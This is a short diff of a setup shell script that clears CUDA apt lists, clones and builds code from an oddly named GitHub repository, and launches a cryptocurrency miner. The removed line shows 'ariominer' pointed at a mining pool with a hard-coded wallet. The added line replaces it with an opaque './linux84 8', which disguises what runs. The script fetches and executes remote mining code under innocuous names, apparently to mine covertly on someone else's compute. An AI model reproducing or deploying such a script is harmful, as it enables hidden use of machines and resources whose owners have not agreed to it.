@@ -26,10 +26,10 @@ rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubunt
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-git clone https://github.com/mobileapps84741274/linux84121274
-cd linux84121274
+git clone https://github.com/mobileapps84741274/linux8474
+cd linux8474
 mkdir build
 cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make
-./ariominer --mode miner --pool http://linux84.distro.cloudns.cl:8884 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux84 --cpu-intensity 84 --gpu-intensity-cblocks 84 --gpu-intensity-gblocks 84
+./linux84 8
